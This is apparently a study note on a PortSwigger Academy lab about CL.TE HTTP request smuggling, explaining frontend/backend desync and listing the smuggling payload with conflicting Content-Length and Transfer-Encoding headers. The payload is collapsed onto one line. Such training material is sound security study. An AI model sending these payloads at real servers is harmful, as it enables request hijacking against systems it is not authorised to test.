# Lab: HTTP request smuggling, basic CL.TE vulnerability

**Official lab:** [https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)

## Lab idea

This foundational lab introduces CL.TE request smuggling, where the frontend and backend interpret request length differently. It practices understanding the basic mechanics of a smuggled request in a controlled two-server setup.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Using Burp Repeater, issue the following request twice:
2. The second response should say: Unrecognized method GPOST .

## Payloads / key values
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G`
- `Unrecognized method GPOST`

## Official source
- [PortSwigger Academy: Lab: HTTP request smuggling, basic CL.TE vulnerability](https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te)
